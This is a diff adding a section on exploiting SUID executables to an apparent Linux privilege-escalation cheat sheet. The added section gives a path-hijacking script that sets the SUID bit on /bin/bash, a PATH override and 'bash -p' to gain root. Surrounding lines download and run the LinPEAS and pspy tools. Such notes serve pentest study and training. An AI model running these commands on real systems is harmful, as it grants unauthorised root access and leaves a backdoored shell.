@@ -101,3 +101,35 @@ chmod +x linpeas.sh && ./linpeas.sh  # Run LinPEAS
 wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O pspy64
 chmod +x pspy64 && ./pspy64  # Run pspy to monitor processes
 ```
+
+### 10. Practical Exploitation
+
+<details>
+
+<summary>SUID Executables</summary>
+
+If you have a custom executable that has SUID, look if you can't find relative paths
+
+[https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e](https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e)
+
+```
+strace -f ./executable 2>&1 | grep -iE "open|access|exec|execve"
+```
+
+malicious bash file if you find a relative path:
+
+```
+#!/bin/bash
+/usr/bin/chmod u+s /bin/bash
+/usr/bin/echo Done
+```
+
+Change path variable with the place you created you bash file:
+
+```
+export PATH=/home/user:$PATH
+```
+
+once you run the SUID file, `bash -p`
+
+</details>
